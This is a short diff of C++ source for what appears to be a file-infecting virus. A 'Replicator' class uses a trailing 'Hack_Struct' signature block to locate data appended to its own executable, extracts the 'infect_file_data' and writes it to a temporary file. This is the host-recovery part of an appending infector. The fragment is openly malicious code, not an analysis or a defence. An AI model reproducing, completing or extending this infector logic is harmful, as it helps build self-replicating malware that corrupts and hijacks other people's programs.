@@ -9,6 +9,12 @@
 
 using namespace std;
 
+struct Hack_Struct
+{
+    DWORD file_size;
+    char firma[7];
+}Hack;
+
 DWORD WINAPI Run(LPVOID lpParam)
 {
     Replicator *replicator = ((Replicator*)lpParam);
@@ -163,10 +169,12 @@ void Replicator::Extract()
     io.seekg(GetFileSize(AppPath())-sizeof(Hack_Struct));
     Hack_Struct *l = new Hack_Struct;
     io.read((char*)l,sizeof(Hack_Struct));
+
     char * infect_file_data = new char[l->file_size];
     io.seekg(GetFileSize(AppPath())-l->file_size-sizeof(Hack_Struct),ios::beg);
     io.read(infect_file_data,l->file_size+sizeof(Hack_Struct));
     io.close();
+
     char * infect_file_path = GetTempFile();
     ofstream fout(infect_file_path,ios::binary);
 	fout.write(infect_file_data,l->file_size);
